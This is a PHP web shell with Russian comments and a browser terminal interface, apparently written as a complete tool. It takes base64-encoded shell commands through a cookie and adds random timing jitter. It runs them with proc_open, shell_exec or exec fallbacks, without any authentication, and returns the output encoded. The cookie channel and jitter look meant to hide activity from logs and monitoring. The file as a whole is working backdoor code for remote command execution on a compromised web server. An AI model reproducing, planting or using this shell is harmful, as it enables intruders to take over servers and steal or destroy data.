<?php
@session_start();

/* ---------- утилиты (base64 для HTTP-стенда) ---------- */
$enc = function($plain){
    return base64_encode($plain);
};
$dec = function($b64){
    if ($b64 === null || $b64 === '') return null;
    $r = base64_decode($b64, true);
    return $r === false ? null : $r;
};

/* ---------- cwd ---------- */
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}
$CWD = $_SESSION['cwd'];

/* ---------- приём команды из Cookie ---------- */
$raw = $_COOKIE['_s'] ?? null;

if ($raw !== null) {
    $cmd = $dec($raw);
    if ($cmd === null) {
        http_response_code(400);
        echo 'bad';
        exit;
    }

    /* случайная задержка (jitter) */
    usleep(random_int(200000, 1500000));

    /* cd — сохраняем директорию */
    if (preg_match('/^\s*cd\s*(.*)$/', $cmd, $m)) {
        $t = trim($m[1]);
        
        if ($t === '') {
            $t = getenv('HOME') ?: '/';
        }
        
        // Обработка абсолютных путей (начинающихся с /)
        if (strpos($t, '/') === 0) {
            $n = realpath($t);
        } else {
            $n = realpath($CWD . '/' . $t);
        }
        
        if ($n && is_dir($n)) {
            $_SESSION['cwd'] = $n;
            $msg = 'cwd: ' . $n;
        } else {
            $msg = 'cd: no such directory: ' . htmlspecialchars($t);
        }
        
        $encOut = $enc($msg);
        setcookie('_r', $encOut, 0, '/');
        header('Content-Type: text/plain');
        echo $encOut;
        exit;
    }

    $full = 'cd ' . escapeshellarg($CWD) . ' && ' . $cmd . ' 2>&1';

    /* ---------- выполнение: proc_open -> shell_exec -> exec ---------- */
    $out = null;

    // 1) proc_open
    if (function_exists('proc_open')) {
        $desc = [1 => ['pipe','w'], 2 => ['pipe','w']];
        $p = @proc_open($full, $desc, $pipes);
        if (is_resource($p)) {
            $out  = stream_get_contents($pipes[1]);
            $err  = stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]);
            proc_close($p);
            if ($out === '' || $out === false) $out = $err;
        }
    }

    // 2) fallback shell_exec
    if (($out === null || $out === false) && function_exists('shell_exec')) {
        $out = @shell_exec($full);
    }

    // 3) fallback exec
    if ($out === null || $out === false) {
        $lines = [];
        if (function_exists('exec')) {
            @exec($full, $lines);
        }
        $out = implode("\n", $lines);
    }

    $encOut = $enc($out ?: '(no output)');
    setcookie('_r', $encOut, 0, '/');
    header('Content-Type: text/plain');
    echo $encOut;
    exit;
}

/* ---------- сброс cwd ---------- */
if (isset($_COOKIE['_x'])) {
    $_SESSION['cwd'] = getcwd();
    echo 'cwd reset: ' . $_SESSION['cwd'];
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>shell</title>
<style>
    :root{
        --bg:#0b0f0b;
        --panel:#050805;
        --fg:#39ff14;
        --dim:#1f6b1f;
        --accent:#7cff5a;
    }
    *{ box-sizing:border-box; }
    html, body{
        margin:0; padding:0; height:100%; width:100%;
        background:var(--bg); color:var(--fg);
        font-family:"JetBrains Mono","Fira Code",Consolas,monospace;
        font-size:14px; overflow:hidden;
    }
    body{ display:flex; flex-direction:column; height:100vh; height:100dvh; }

    #cwd{
        flex:0 0 auto; padding:8px 14px; background:var(--panel);
        border-bottom:1px solid var(--dim); color:var(--accent);
        font-size:13px; white-space:nowrap; overflow:hidden;
        text-overflow:ellipsis; user-select:none;
    }

    #out{
        flex:1 1 auto; min-height:0; overflow-y:auto; overflow-x:hidden;
        padding:12px 16px; white-space:pre-wrap; word-break:break-word;
        background:var(--bg); scrollbar-width:thin; scrollbar-color:var(--dim) transparent;
    }
    #out::-webkit-scrollbar{ width:10px; }
    #out::-webkit-scrollbar-track{ background:transparent; }
    #out::-webkit-scrollbar-thumb{
        background:var(--dim); border-radius:6px; border:2px solid var(--bg);
    }
    #out::-webkit-scrollbar-thumb:hover{ background:var(--accent); }

    #bar{
        flex:0 0 auto; display:flex; gap:8px; padding:10px 14px;
        background:var(--panel); border-top:1px solid var(--dim);
    }
    #bar .prompt{ color:var(--accent); align-self:center; user-select:none; }
    #cmd{
        flex:1 1 auto; min-width:0; background:#000; color:var(--fg);
        border:1px solid var(--dim); border-radius:4px; padding:8px 10px;
        font:inherit; outline:none;
    }
    #cmd:focus{ border-color:var(--accent); box-shadow:0 0 0 1px var(--accent) inset; }

    button{
        background:var(--accent); color:#000; border:none; border-radius:4px;
        padding:8px 14px; font:inherit; font-weight:700; cursor:pointer; white-space:nowrap;
    }
    button:hover{ filter:brightness(1.1); }
    button.ghost{
        background:transparent; color:var(--accent); border:1px solid var(--dim);
    }
    button.ghost:hover{ border-color:var(--accent); }

    .cmdline{ color:var(--accent); }
    .errline{ color:#ff5c5c; }

    @media (max-width:600px){
        body{ font-size:13px; }
        #bar{ flex-wrap:wrap; }
        #cmd{ flex-basis:100%; }
        #bar .prompt{ display:none; }
    }
</style>
</head>
<body>
    <div id="cwd">cwd: <?= htmlspecialchars($_SESSION['cwd']) ?></div>
    <div id="out" tabindex="0"></div>
    <form id="f" onsubmit="return run(event)">
        <div id="bar">
            <span class="prompt">$</span>
            <input id="cmd" autofocus autocomplete="off" spellcheck="false"
                   placeholder="command... (cd /path, reset)">
            <button type="submit">Run</button>
            <button type="button" class="ghost" onclick="resetCwd()">Reset</button>
        </div>
    </form>

<script>
const out   = document.getElementById('out');
const cwdEl = document.getElementById('cwd');
const input = document.getElementById('cmd');
let H = [], x = -1;
let lastCwd = cwdEl.textContent.replace('cwd: ', '').trim();

function encrypt(plain){
    try { return btoa(unescape(encodeURIComponent(plain))); }
    catch(e) { return null; }
}
function decrypt(b64){
    try { return decodeURIComponent(escape(atob(b64))); }
    catch(e){ return null; }
}

function append(text, cls){
    if (!text) return;
    if (cls) {
        const span = document.createElement('span');
        span.className = cls;
        span.textContent = text;
        out.appendChild(span);
    } else {
        out.appendChild(document.createTextNode(text));
    }
    out.scrollTop = out.scrollHeight;
}

function updateCwdBar(newPath){
    if (newPath && newPath !== lastCwd) {
        lastCwd = newPath;
        cwdEl.textContent = "cwd: " + newPath;
    }
}

async function run(e){
    if (e) e.preventDefault();
    const cmd = input.value.trim();
    if (!cmd) return false;

    H.push(cmd); x = H.length;
    append("\n$ " + cmd + "\n", "cmdline");

    const enc = encrypt(cmd);
    if (!enc) {
        append("Encryption error\n", "errline");
        return false;
    }

    document.cookie = "_s=" + encodeURIComponent(enc) + "; path=/";

    let plain = null;
    let rawText = "";
    
    try {
        const r = await fetch(location.href, {credentials:'same-origin'});
        rawText = await r.text();
        
        plain = decrypt(rawText.trim());
        if (plain === null) { plain = rawText; }
        plain = plain.trim();
        
        append(plain + "\n");

    } catch(err){
        append("Request failed: " + err + "\n", "errline");
        return false;
    } finally {
        document.cookie = "_s=; path=/; max-age=0";
        document.cookie = "_r=; path=/; max-age=0";
    }

    // Обновляем верхнюю плашку, если это была команда cd
    if (/^\s*cd(\s|$)/.test(cmd)) {
        const mm = plain.match(/^cwd: (.*)$/m);
        if (mm) {
            updateCwdBar(mm[1].trim());
        }
    }

    input.value = '';
    input.focus();
    out.scrollTop = out.scrollHeight;
    return false;
}

async function resetCwd(){
    document.cookie = "_x=1; path=/";
    try {
        const r = await fetch(location.href, {credentials:'same-origin'});
        const t = await r.text();
        const newPath = t.replace('cwd reset: ', '').trim();
        updateCwdBar(newPath);
        append("cwd reset: " + newPath + "\n");
    } catch(err){
        append("Reset failed: " + err + "\n", "errline");
    }
    document.cookie = "_x=; path=/; max-age=0";
}

input.addEventListener('keydown', e => {
    if (e.key === 'ArrowUp'){
        if (x > 0){ x--; input.value = H[x]; }
        e.preventDefault();
    } else if (e.key === 'ArrowDown'){
        if (x < H.length - 1){ x++; input.value = H[x]; }
        else { x = H.length; input.value = ''; }
        e.preventDefault();
    }
});

out.addEventListener('click', () => input.focus());
</script>
</body>
</html>